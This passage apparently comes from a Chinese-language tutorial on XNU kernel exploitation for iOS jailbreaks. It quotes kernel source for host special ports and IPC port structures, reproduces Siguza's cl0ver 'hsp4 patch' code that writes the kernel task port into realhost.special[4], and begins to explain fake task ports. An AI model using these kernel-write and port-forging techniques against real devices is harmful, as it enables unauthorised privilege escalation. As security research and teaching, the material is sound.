<p>因此尽管能够得到内核任务，但是仍将无法在其上调用Mach API，因为这里会返回<code>KERN_INVALID_SECURITY</code>，从而之前的函数将返回<code>TASK_NULL</code>。</p>
<blockquote>
<p>在嵌入式平台上，代码会检查代码签名中的<code>TF_PLATFORM</code>标志，它是<code>platform-application entitlement</code>，这意味着没有此entitlement的caller无法对拥有这项entitlement的victim执行操作(只有Apple的文件才有这个entitlement)。</p>
</blockquote>
<p>因此，较新的技术之一就是使用<code>host_get_special_port()</code>函数，来看看<code>osfmk/mach/host_special_ports.h</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Cannot be set or gotten from user space</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_SECURITY_PORT               0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_MIN_SPECIAL_PORT            HOST_SECURITY_PORT</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Always provided by kernel (cannot be set from user-space).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_PORT                        1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_PRIV_PORT                   2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_IO_MASTER_PORT              3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_MAX_SPECIAL_KERNEL_PORT     7 <span class="comment">/* room to grow */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_LAST_SPECIAL_KERNEL_PORT    HOST_IO_MASTER_PORT</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Not provided by kernel</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_DYNAMIC_PAGER_PORT         (1 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_AUDIT_CONTROL_PORT         (2 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_USER_NOTIFICATION_PORT     (3 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_AUTOMOUNTD_PORT            (4 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_LOCKD_PORT                 (5 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_KTRACE_BACKGROUND_PORT     (6 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_SEATBELT_PORT              (7 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_KEXTD_PORT                 (8 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_LAUNCHCTL_PORT             (9 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_UNFREED_PORT		(10 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_AMFID_PORT			(11 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_GSSD_PORT			(12 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_TELEMETRY_PORT		(13 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_ATM_NOTIFICATION_PORT	(14 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_COALITION_PORT		(15 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_SYSDIAGNOSE_PORT           (16 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_XPC_EXCEPTION_PORT		(17 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_CONTAINERD_PORT		(18 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_NODE_PORT			(19 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_RESOURCE_NOTIFY_PORT	(20 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_CLOSURED_PORT		(21 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_SYSPOLICYD_PORT		(22 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_MAX_SPECIAL_PORT		HOST_SYSPOLICYD_PORT</span></span><br><span class="line">                                        <span class="comment">/* MAX = last since rdar://35861175 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* obsolete name */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_CHUD_PORT HOST_LAUNCHCTL_PORT</span></span><br></pre></td></tr></table></figure>

<p>从注释中可以看出前七个端口是为内核本身保留的。但是到目前为止，仅使用了其中的三个。HOST_PORT提供了主机的抽象，HOST_PRIV用于特权操作，而HOST_IO_MASTER_PORT用于与设备进行交互。每个特殊端口都有特定的编号，这非常重要。我们可以注意到没有使用编号4。</p>
<p>此外，为了获得发送到主机特殊端口的权限需要使用一个int参数调用<code>host_get_special_port</code>，该参数是分配给该特殊端口的编号。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *      User interface for setting a special port.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      Only permits the user to set a user-owned special port</span></span><br><span class="line"><span class="comment"> *      ID, rejecting a kernel-owned special port ID.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      A special kernel port cannot be set up using this</span></span><br><span class="line"><span class="comment"> *      routine; use kernel_set_special_port() instead.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">host_set_special_port</span><span class="params">(<span class="type">host_priv_t</span> host_priv, <span class="type">int</span> id, <span class="type">ipc_port_t</span> port)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (host_priv == HOST_PRIV_NULL || id &lt;= HOST_MAX_SPECIAL_KERNEL_PORT || id &gt; HOST_MAX_SPECIAL_PORT)</span><br><span class="line">		<span class="keyword">return</span> (KERN_INVALID_ARGUMENT);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> CONFIG_MACF</span></span><br><span class="line">	<span class="keyword">if</span> (mac_task_check_set_host_special_port(current_task(), id, port) != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> (KERN_NO_ACCESS);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (kernel_set_special_port(host_priv, id, port));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *      User interface for retrieving a special port.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      Note that there is nothing to prevent a user special</span></span><br><span class="line"><span class="comment"> *      port from disappearing after it has been discovered by</span></span><br><span class="line"><span class="comment"> *      the caller; thus, using a special port can always result</span></span><br><span class="line"><span class="comment"> *      in a &quot;port not valid&quot; error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">host_get_special_port</span><span class="params">(<span class="type">host_priv_t</span> host_priv, __unused <span class="type">int</span> node, <span class="type">int</span> id, <span class="type">ipc_port_t</span> * portp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">ipc_port_t</span> port;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (host_priv == HOST_PRIV_NULL || id == HOST_SECURITY_PORT || id &gt; HOST_MAX_SPECIAL_PORT || id &lt; HOST_MIN_SPECIAL_PORT)</span><br><span class="line">		<span class="keyword">return</span> (KERN_INVALID_ARGUMENT);</span><br><span class="line"></span><br><span class="line">	host_lock(host_priv);</span><br><span class="line">	port = realhost.special[id];</span><br><span class="line">	*portp = ipc_port_copy_send(port);</span><br><span class="line">	host_unlock(host_priv);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (KERN_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看该函数，我们可以看到它需要host_priv端口作为参数，因此除了满足所有沙盒检查之外，执行此调用还需要root权限。<code>host_get_special_port</code>函数从<code>realhost.special[id]</code>得到端口值并返回给调用者。<br>回到指针检查，如果我们可以重新映射内核任务，将其写入未使用的端口空间，即<code>realhost.special[4]</code>，然后调用<code>host_get_special_port(4)</code>，这应该就可以得到可用的内核任务。</p>
<p>该技术也称为hsp4 patch，广泛用于最近的一些越狱中，<a target="_blank" rel="noopener" href="https://twitter.com/Siguza">Siguza</a>编写的cl0ver中的利用代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">patch_host_special_port_4</span><span class="params">(<span class="type">task_t</span> kernel_task)</span></span><br><span class="line">&#123;</span><br><span class="line">    DEBUG(<span class="string">&quot;Installing host_special_port(4) patch...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">addr_t</span> *special = (<span class="type">addr_t</span>*)offsets.slid.data_realhost_special;</span><br><span class="line">    <span class="type">vm_address_t</span> kernel_task_addr,</span><br><span class="line">                 kernel_self_port_addr,</span><br><span class="line">                 old_port_addr;</span><br><span class="line">    <span class="type">vm_size_t</span> size;</span><br><span class="line">    <span class="type">kern_return_t</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get address of kernel task</span></span><br><span class="line">    size = <span class="keyword">sizeof</span>(kernel_task_addr);</span><br><span class="line">    ret = vm_read_overwrite(kernel_task, (<span class="type">vm_address_t</span>)offsets.slid.data_kernel_task, <span class="keyword">sizeof</span>(kernel_task_addr), (<span class="type">vm_address_t</span>)&amp;kernel_task_addr, &amp;size);</span><br><span class="line">    <span class="keyword">if</span>(ret != KERN_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        THROW(<span class="string">&quot;Failed to get kernel task address: %s&quot;</span>, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line">    DEBUG(<span class="string">&quot;Kernel task address: &quot;</span> ADDR, (<span class="type">addr_t</span>)kernel_task_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get address of kernel task/self port</span></span><br><span class="line">    size = <span class="keyword">sizeof</span>(kernel_self_port_addr);</span><br><span class="line">    ret = vm_read_overwrite(kernel_task, kernel_task_addr + offsets.unslid.off_task_itk_self, <span class="keyword">sizeof</span>(kernel_self_port_addr), (<span class="type">vm_address_t</span>)&amp;kernel_self_port_addr, &amp;size);</span><br><span class="line">    <span class="keyword">if</span>(ret != KERN_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        THROW(<span class="string">&quot;Failed to get kernel task port address: %s&quot;</span>, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line">    DEBUG(<span class="string">&quot;Kernel task port address: &quot;</span> ADDR, (<span class="type">addr_t</span>)kernel_self_port_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if realhost.special[4] is set already</span></span><br><span class="line">    size = <span class="keyword">sizeof</span>(old_port_addr);</span><br><span class="line">    ret = vm_read_overwrite(kernel_task, (<span class="type">vm_address_t</span>)(&amp;special[<span class="number">4</span>]), <span class="keyword">sizeof</span>(old_port_addr), (<span class="type">vm_address_t</span>)&amp;old_port_addr, &amp;size);</span><br><span class="line">    <span class="keyword">if</span>(ret != KERN_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        THROW(<span class="string">&quot;Failed to read realhost.special[4]: %s&quot;</span>, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(old_port_addr != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(old_port_addr == kernel_self_port_addr)</span><br><span class="line">        &#123;</span><br><span class="line">            DEBUG(<span class="string">&quot;Patch already in place, nothing to do&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            THROW(<span class="string">&quot;realhost.special[4] has a valid port already&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write to realhost.special[4]</span></span><br><span class="line">    ret = vm_write(kernel_task, (<span class="type">vm_address_t</span>)(&amp;special[<span class="number">4</span>]), (<span class="type">vm_address_t</span>)&amp;kernel_self_port_addr, <span class="keyword">sizeof</span>(kernel_self_port_addr));</span><br><span class="line">    <span class="keyword">if</span>(ret != KERN_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        THROW(<span class="string">&quot;Failed to patch realhost.special[4]: %s&quot;</span>, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DEBUG(<span class="string">&quot;Successfully installed patch&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="伪造任务端口"><a href="#伪造任务端口" class="headerlink" title="伪造任务端口"></a>伪造任务端口</h3><p>最近常见的越狱技术之一是使用伪造的端口。内核以为是端口，但是实际是用户控制的内存空间。然后使用某些API可以从内核中提取数据。<code>osfmk/ipc/ipc_port.h中定义</code>的端口结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span> &#123;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Initial sub-structure in common with ipc_pset</span></span><br><span class="line"><span class="comment">	 * First element is an ipc_object second is a</span></span><br><span class="line"><span class="comment">	 * message queue</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_object</span> <span class="title">ip_object</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_mqueue</span> <span class="title">ip_messages</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">ipc_space</span> *<span class="title">receiver</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span> *<span class="title">destination</span>;</span></span><br><span class="line">		<span class="type">ipc_port_timestamp_t</span> timestamp;</span><br><span class="line">	&#125; data;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">ipc_kobject_t</span> kobject;</span><br><span class="line">		<span class="type">ipc_importance_task_t</span> imp_task;</span><br><span class="line">		<span class="type">ipc_port_t</span> sync_inheritor_port;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">knote</span> *<span class="title">sync_inheritor_knote</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">turnstile</span> *<span class="title">sync_inheritor_ts</span>;</span></span><br><span class="line">	&#125; kdata;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span> *<span class="title">ip_nsrequest</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span> *<span class="title">ip_pdrequest</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_port_request</span> *<span class="title">ip_requests</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">ipc_kmsg</span> *<span class="title">premsg</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">turnstile</span> *<span class="title">send_turnstile</span>;</span></span><br><span class="line">		SLIST_ENTRY(ipc_port) dealloc_elm;</span><br><span class="line">	&#125; kdata2;</span><br></pre></td></tr></table></figure>

<p>第一个成员是<code>ipc_object</code>，可以在<code>osfmk/ipc/ipc_object.h</code>中找到其定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The ipc_object is used to both tag and reference count these two data</span></span><br><span class="line"><span class="comment"> * structures, and (Noto Bene!) pointers to either of these or the</span></span><br><span class="line"><span class="comment"> * ipc_object at the head of these are freely cast back and forth; hence</span></span><br><span class="line"><span class="comment"> * the ipc_object MUST BE FIRST in the ipc_common_data.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If the RPC implementation enabled user-mode code to use kernel-level</span></span><br><span class="line"><span class="comment"> * data structures (as ours used to), this peculiar structuring would</span></span><br><span class="line"><span class="comment"> * avoid having anything in user code depend on the kernel configuration</span></span><br><span class="line"><span class="comment"> * (with which lock size varies).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_object</span> &#123;</span></span><br><span class="line">	<span class="type">ipc_object_bits_t</span> io_bits;</span><br><span class="line">	<span class="type">ipc_object_refs_t</span> io_references;</span><br><span class="line">	<span class="type">lck_spin_t</span>	io_lock_data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>ipc_object</code>的第一个成员<code>io_bits</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	IPC steals the high-order bits from the kotype to use</span></span><br><span class="line"><span class="comment"> *	for its own purposes.  This allows IPC to record facts</span></span><br><span class="line"><span class="comment"> *	about ports that aren&#x27;t otherwise obvious from the</span></span><br><span class="line"><span class="comment"> *	existing port fields.  In particular, IPC can optionally</span></span><br><span class="line"><span class="comment"> *	mark a port for no more senders detection.  Any change</span></span><br><span class="line"><span class="comment"> *	to IO_BITS_PORT_INFO must be coordinated with bitfield</span></span><br><span class="line"><span class="comment"> *	definitions in ipc_port.h.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IO_BITS_PORT_INFO	0x0000f000	<span class="comment">/* stupid port tricks */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IO_BITS_KOTYPE		0x00000fff	<span class="comment">/* used by the object */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IO_BITS_OTYPE		0x7fff0000	<span class="comment">/* determines a zone */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IO_BITS_ACTIVE		0x80000000	<span class="comment">/* is object alive? */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	io_active(io)		(((io)-&gt;io_bits &amp; IO_BITS_ACTIVE) != 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	io_otype(io)		(((io)-&gt;io_bits &amp; IO_BITS_OTYPE) &gt;&gt; 16)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	io_kotype(io)		((io)-&gt;io_bits &amp; IO_BITS_KOTYPE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	io_makebits(active, otype, kotype)	\</span></span><br><span class="line"><span class="meta">	(((active) ? IO_BITS_ACTIVE : 0) | ((otype) &lt;&lt; 16) | (kotype))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Object types: ports, port sets, kernel-loaded ports</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IOT_PORT		0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOT_PORT_SET		1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOT_NUMBER		2		<span class="comment">/* number of types used */</span></span></span><br></pre></td></tr></table></figure>

<p>需要设置IO_BITS_ACTIVE以确保该对象存活。IO_BITS_OTYPE指定对象类型。IO_BITS_KOTYPE指定端口类型，是一个任务端口或时钟端口等。创建伪造的端口时需要在io_bits中指定这些值。完整列表可以在<code>BUILD/obj/EXPORT_HDRS/osfmk/kern/ipc_kobject.h</code>中找到。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">092</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_NONE               0</span></span><br><span class="line"><span class="number">093</span>: <span class="meta">#<span class="keyword">define</span> IKOT_THREAD                1</span></span><br><span class="line"><span class="number">094</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_TASK               2</span></span><br><span class="line"><span class="number">095</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_HOST               3</span></span><br><span class="line"><span class="number">096</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_HOST_PRIV          4</span></span><br><span class="line"><span class="number">097</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_PROCESSOR          5</span></span><br><span class="line"><span class="number">098</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_PSET               6</span></span><br><span class="line"><span class="number">099</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_PSET_NAME          7</span></span><br><span class="line"><span class="number">100</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_TIMER              8</span></span><br><span class="line"><span class="number">101</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_PAGING_REQUEST     9</span></span><br><span class="line"><span class="number">102</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_MIG                10</span></span><br><span class="line"><span class="number">103</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_MEMORY_OBJECT      11</span></span><br><span class="line"><span class="number">104</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_XMM_PAGER          12</span></span><br><span class="line"><span class="number">105</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_XMM_KERNEL         13</span></span><br><span class="line"><span class="number">106</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_XMM_REPLY          14</span></span><br><span class="line"><span class="number">107</span>: <span class="meta">#<span class="keyword">define</span> IKOT_UND_REPLY         15</span></span><br><span class="line"><span class="number">108</span>: <span class="meta">#<span class="keyword">define</span> IKOT_HOST_NOTIFY       16</span></span><br><span class="line"><span class="number">109</span>: <span 